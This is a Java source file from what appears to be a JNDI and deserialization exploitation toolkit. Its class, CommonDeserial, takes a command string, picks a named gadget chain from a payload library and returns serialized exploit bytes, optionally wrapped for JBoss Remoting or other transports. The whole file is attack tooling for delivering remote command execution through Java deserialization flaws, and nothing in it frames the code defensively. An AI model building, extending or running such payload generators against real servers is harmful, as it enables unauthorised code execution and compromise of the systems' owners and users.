package jndi;

import payloads.face.ObjectPayload;
import wrappers.*;

import java.lang.reflect.Method;

@SuppressWarnings("rawtypes")
public class CommonDeserial {
    private String command;

    public CommonDeserial(String command){
        this.command = command;
    }

    public byte[] execByDeserialize(String gadgetType, String wrapperType, Boolean fusion) throws Exception {
        byte[] bytes = {};
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("payloads.deserial."+gadgetType);
        if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
            throw new IllegalArgumentException("No such Deserial Payload Name: " + gadgetType);
        }

        if (wrapperType == null){
            Method method = payloadClass.getMethod("getBytes", String.class, Boolean.class);
            bytes = (byte[])method.invoke(payloadClass.newInstance(), command, fusion);
        }else if (wrapperType.equals("JbossRemoting")){
            Method method = payloadClass.getMethod("getBytes", String.class, Boolean.class);
            bytes = (byte[])method.invoke(payloadClass.newInstance(), command, fusion);
            JbossRemotingWrap wrap = new JbossRemotingWrap();
            bytes = wrap.wrap(bytes);
        }else{
            Method method = payloadClass.getMethod("getObject", String.class);
            Object obj = method.invoke(payloadClass.newInstance(), command);
            final Class<? extends ObjectWrapper> wrapperClass = ObjectWrapper.Utils.getWrapperClass(wrapperType);
            if ( wrapperClass == null || !ObjectWrapper.class.isAssignableFrom(wrapperClass) ) {
                throw new IllegalArgumentException("No such Wrapper: " + wrapperType);
            }
            Method method2 = wrapperClass.getMethod("wrap", Object.class);
            bytes = (byte[])method2.invoke(wrapperClass.newInstance(), obj);
        }
        return bytes;
    }

}
